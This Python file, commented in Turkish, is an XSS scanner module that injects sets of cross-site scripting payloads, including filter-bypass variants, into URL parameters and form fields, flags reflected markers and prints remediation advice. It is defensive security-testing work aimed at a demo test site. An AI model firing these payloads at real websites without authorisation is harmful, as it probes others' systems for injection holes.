#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Nexus-Scanner XSS (Cross-Site Scripting) Detection Module
Profesyonel siber güvenlik aracı - XSS açığı tespiti

Bu modül web uygulamalarında XSS güvenlik açıklarını tespit eder.
"""

import requests
import urllib.parse
import time
import re
from typing import List, Dict, Any, Optional
from dataclasses import dataclass
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup

@dataclass
class XSSResult:
    """XSS test sonucu"""
    url: str
    parameter: str
    payload: str
    vulnerable: bool
    xss_type: str = ""  # reflected, stored, dom
    context: str = ""  # html, attribute, script, etc.
    error_message: str = ""
    confidence: str = "low"  # low, medium, high
    risk_level: str = "info"  # info, low, medium, high, critical

class XSSScanner:
    """Cross-Site Scripting güvenlik açığı tarayıcısı"""
    
    def __init__(self, timeout: int = 10, delay: float = 1.0):
        self.timeout = timeout
        self.delay = delay
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Nexus-Scanner/1.0 (Security Testing Tool)'
        })
        
        # XSS test payloadları
        self.payloads = {
            'basic': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "javascript:alert('XSS')",
                "'><script>alert('XSS')</script>",
                '"<script>alert("XSS")</script>'
            ],
            'advanced': [
                "<script>alert(String.fromCharCode(88,83,83))</script>",
                "<img src=\"javascript:alert('XSS')\">",
                "<iframe src=\"javascript:alert('XSS')\"></iframe>",
                "<body onload=alert('XSS')>",
                "<input onfocus=alert('XSS') autofocus>",
                "<select onfocus=alert('XSS') autofocus><option>test</option></select>"
            ],
            'filter_bypass': [
                "<ScRiPt>alert('XSS')</ScRiPt>",
                "<script>alert(/XSS/)</script>",
                "<script>alert`XSS`</script>",
                "<script>eval('alert(\"XSS\")')</script>",
                "<script>setTimeout('alert(\"XSS\")',1)</script>",
                "<script src=data:text/javascript,alert('XSS')></script>"
            ],
            'attribute_based': [
                "\" onmouseover=\"alert('XSS')\"",
                "' onmouseover='alert(\"XSS\")'",
                "\" autofocus onfocus=\"alert('XSS')\"",
                "' style='background:url(javascript:alert(\"XSS\"))'",
                "\" href=\"javascript:alert('XSS')\""
            ],
            'dom_based': [
                "#<script>alert('XSS')</script>",
                "javascript:alert('XSS')",
                "data:text/html,<script>alert('XSS')</script>",
                "<img src=x onerror=alert(document.domain)>"
            ]
        }
        
        # XSS tespit için unique marker
        self.unique_marker = "NEXUS_XSS_TEST_" + str(int(time.time()))
    
    def scan_url(self, url: str, parameters: Dict[str, str] = None, 
                 test_forms: bool = True) -> List[XSSResult]:
        """Belirtilen URL'yi XSS açıkları için tarar"""
        results = []
        
        print(f"🔍 XSS taraması başlatılıyor: {url}")
        
        # URL parametrelerini test et
        if parameters or '?' in url:
            if not parameters:
                parsed_url = urlparse(url)
                if parsed_url.query:
                    parameters = dict(urllib.parse.parse_qsl(parsed_url.query))
                    url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
            
            if parameters:
                results.extend(self._test_url_parameters(url, parameters))
        
        # Form inputlarını test et
        if test_forms:
            results.extend(self._test_forms(url))
        
        return results
    
    def _test_url_parameters(self, url: str, parameters: Dict[str, str]) -> List[XSSResult]:
        """URL parametrelerini XSS için test eder"""
        results = []
        
        for param_name, param_value in parameters.items():
            print(f"  📋 URL parametresi test ediliyor: {param_name}")
            
            for payload_type, payloads in self.payloads.items():
                for payload in payloads:
                    # Unique marker ekle
                    test_payload = payload.replace("XSS", self.unique_marker)
                    
                    result = self._test_parameter(url, parameters, param_name, 
                                                test_payload, payload_type, "GET")
                    if result:
                        results.append(result)
                        if result.vulnerable:
                            print(f"  ⚠️  XSS tespit edildi: {param_name} - {payload_type}")
                    
                    time.sleep(self.delay)
        
        return results
    
    def _test_forms(self, url: str) -> List[XSSResult]:
        """Sayfadaki formları XSS için test eder"""
        results = []
        
        try:
            response = self.session.get(url, timeout=self.timeout)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            forms = soup.find_all('form')
            print(f"  📝 {len(forms)} form bulundu")
            
            for i, form in enumerate(forms):
                print(f"  📋 Form {i+1} test ediliyor")
                results.extend(self._test_single_form(url, form))
                
        except Exception as e:
            print(f"  ❌ Form testi hatası: {str(e)}")
        
        return results
    
    def _test_single_form(self, base_url: str, form) -> List[XSSResult]:
        """Tek bir formu test eder"""
        results = []
        
        try:
            # Form action ve method bilgilerini al
            action = form.get('action', '')
            method = form.get('method', 'GET').upper()
            
            if action:
                form_url = urljoin(base_url, action)
            else:
                form_url = base_url
            
            # Form inputlarını bul
            inputs = form.find_all(['input', 'textarea', 'select'])
            form_data = {}
            
            for input_elem in inputs:
                input_type = input_elem.get('type', 'text')
                input_name = input_elem.get('name')
                
                if input_name and input_type not in ['submit', 'button', 'reset']:
                    form_data[input_name] = 'test_value'
            
            # Her input için XSS testi yap
            for input_name in form_data.keys():
                for payload_type, payloads in self.payloads.items():
                    for payload in payloads[:3]:  # Form testleri için payload sayısını sınırla
                        test_payload = payload.replace("XSS", self.unique_marker)
                        
                        result = self._test_form_parameter(form_url, form_data, 
                                                          input_name, test_payload, 
                                                          payload_type, method)
                        if result:
                            results.append(result)
                            if result.vulnerable:
                                print(f"    ⚠️  Form XSS tespit edildi: {input_name}")
                        
                        time.sleep(self.delay)
        
        except Exception as e:
            print(f"    ❌ Form test hatası: {str(e)}")
        
        return results
    
    def _test_parameter(self, url: str, parameters: Dict[str, str], 
                       param_name: str, payload: str, payload_type: str, 
                       method: str = "GET") -> Optional[XSSResult]:
        """Tek bir parametre için XSS testi yapar"""
        
        test_params = parameters.copy()
        test_params[param_name] = payload
        
        try:
            if method == "GET":
                response = self.session.get(url, params=test_params, timeout=self.timeout)
            else:
                response = self.session.post(url, data=test_params, timeout=self.timeout)
            
            # XSS varlığını kontrol et
            is_vulnerable, xss_type, context, confidence, risk_level = self._analyze_xss_response(
                response, payload
            )
            
            return XSSResult(
                url=url,
                parameter=param_name,
                payload=payload,
                vulnerable=is_vulnerable,
                xss_type=xss_type,
                context=context,
                confidence=confidence,
                risk_level=risk_level
            )
            
        except requests.exceptions.RequestException as e:
            return XSSResult(
                url=url,
                parameter=param_name,
                payload=payload,
                vulnerable=False,
                error_message=f"Request error: {str(e)}",
                confidence="low",
                risk_level="info"
            )
    
    def _test_form_parameter(self, url: str, form_data: Dict[str, str], 
                            param_name: str, payload: str, payload_type: str, 
                            method: str) -> Optional[XSSResult]:
        """Form parametresi için XSS testi yapar"""
        
        test_data = form_data.copy()
        test_data[param_name] = payload
        
        try:
            if method == "GET":
                response = self.session.get(url, params=test_data, timeout=self.timeout)
            else:
                response = self.session.post(url, data=test_data, timeout=self.timeout)
            
            is_vulnerable, xss_type, context, confidence, risk_level = self._analyze_xss_response(
                response, payload
            )
            
            return XSSResult(
                url=url,
                parameter=param_name,
                payload=payload,
                vulnerable=is_vulnerable,
                xss_type=xss_type,
                context=context,
                confidence=confidence,
                risk_level=risk_level
            )
            
        except requests.exceptions.RequestException as e:
            return XSSResult(
                url=url,
                parameter=param_name,
                payload=payload,
                vulnerable=False,
                error_message=f"Request error: {str(e)}",
                confidence="low",
                risk_level="info"
            )
    
    def _analyze_xss_response(self, response: requests.Response, payload: str) -> tuple:
        """HTTP yanıtını analiz ederek XSS varlığını tespit eder"""
        
        is_vulnerable = False
        xss_type = "reflected"
        context = "unknown"
        confidence = "low"
        risk_level = "info"
        
        response_text = response.text.lower()
        payload_lower = payload.lower()
        
        # Payload'ın yanıtta olup olmadığını kontrol et
        if self.unique_marker.lower() in response_text:
            is_vulnerable = True
            confidence = "high"
            risk_level = "high"
            
            # Context analizi
            if "<script" in payload_lower and "<script" in response_text:
                context = "script_tag"
                risk_level = "critical"
            elif "onerror" in payload_lower or "onload" in payload_lower:
                context = "event_handler"
                risk_level = "high"
            elif "javascript:" in payload_lower:
                context = "javascript_protocol"
                risk_level = "high"
            elif "<img" in payload_lower or "<svg" in payload_lower:
                context = "html_tag"
                risk_level = "high"
            else:
                context = "html_content"
        
        # Script tag varlığını kontrol et (daha hassas tespit)
        script_patterns = [
            r"<script[^>]*>.*?" + re.escape(self.unique_marker),
            r"on\w+\s*=\s*['\"].*?" + re.escape(self.unique_marker),
            r"javascript:\s*.*?" + re.escape(self.unique_marker)
        ]
        
        for pattern in script_patterns:
            if re.search(pattern, response.text, re.IGNORECASE | re.DOTALL):
                is_vulnerable = True
                confidence = "high"
                risk_level = "critical"
                break
        
        # Content-Type kontrolü
        content_type = response.headers.get('content-type', '').lower()
        if 'application/json' in content_type and is_vulnerable:
            # JSON response'da XSS daha az risk
            risk_level = "medium"
        
        return is_vulnerable, xss_type, context, confidence, risk_level
    
    def generate_report(self, results: List[XSSResult]) -> Dict[str, Any]:
        """Tarama sonuçlarından rapor oluşturur"""
        
        vulnerable_count = sum(1 for r in results if r.vulnerable)
        total_tests = len(results)
        
        # Risk seviyelerine göre grupla
        risk_summary = {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}
        xss_types = {"reflected": 0, "stored": 0, "dom": 0}
        contexts = {}
        
        for result in results:
            if result.vulnerable:
                risk_summary[result.risk_level] += 1
                xss_types[result.xss_type] += 1
                contexts[result.context] = contexts.get(result.context, 0) + 1
        
        # Vulnerable parametreleri listele
        vulnerable_params = []
        for result in results:
            if result.vulnerable:
                vulnerable_params.append({
                    "url": result.url,
                    "parameter": result.parameter,
                    "payload": result.payload,
                    "xss_type": result.xss_type,
                    "context": result.context,
                    "risk_level": result.risk_level,
                    "confidence": result.confidence
                })
        
        return {
            "scan_summary": {
                "total_tests": total_tests,
                "vulnerable_count": vulnerable_count,
                "safe_count": total_tests - vulnerable_count,
                "vulnerability_rate": f"{(vulnerable_count/total_tests*100):.1f}%" if total_tests > 0 else "0%"
            },
            "risk_summary": risk_summary,
            "xss_types": xss_types,
            "contexts": contexts,
            "vulnerable_parameters": vulnerable_params,
            "recommendations": self._get_recommendations(vulnerable_count > 0)
        }
    
    def _get_recommendations(self, has_vulnerabilities: bool) -> List[str]:
        """Güvenlik önerileri döndürür"""
        
        if has_vulnerabilities:
            return [
                "🚨 ACIL: XSS güvenlik açıkları tespit edildi!",
                "✅ Input validation ve output encoding uygulayın",
                "✅ Content Security Policy (CSP) header'ı kullanın",
                "✅ HTML entity encoding yapın",
                "✅ JavaScript'te innerHTML yerine textContent kullanın",
                "✅ Kullanıcı girdilerini asla doğrudan DOM'a yazmayın",
                "✅ X-XSS-Protection header'ını etkinleştirin",
                "✅ Düzenli güvenlik testleri yapın"
            ]
        else:
            return [
                "✅ XSS güvenlik açığı tespit edilmedi",
                "🔄 Düzenli güvenlik taramaları yapmaya devam edin",
                "📚 Güvenli kodlama pratiklerini sürdürün",
                "🛡️ CSP ve diğer güvenlik header'larını güncel tutun"
            ]

# Test fonksiyonu
if __name__ == "__main__":
    scanner = XSSScanner()
    
    # Test URL'i
    test_url = "http://testphp.vulnweb.com/search.php"
    test_params = {"test": "searchterm"}
    
    print("Nexus-Scanner XSS Test")
    print("=" * 30)
    
    results = scanner.scan_url(test_url, test_params)
    report = scanner.generate_report(results)
    
    print("\n📊 Tarama Raporu:")
    print(f"Toplam Test: {report['scan_summary']['total_tests']}")
    print(f"XSS Açığı: {report['scan_summary']['vulnerable_count']}")
    print(f"Güvenli: {report['scan_summary']['safe_count']}")
    
    if report['vulnerable_parameters']:
        print("\n⚠️ Tespit Edilen XSS Açıkları:")
        for vuln in report['vulnerable_parameters']:
            print(f"  - {vuln['parameter']}: {vuln['risk_level']} risk ({vuln['context']})")
    
    print("\n💡 Öneriler:")
    for rec in report['recommendations']:
        print(f"  {rec}")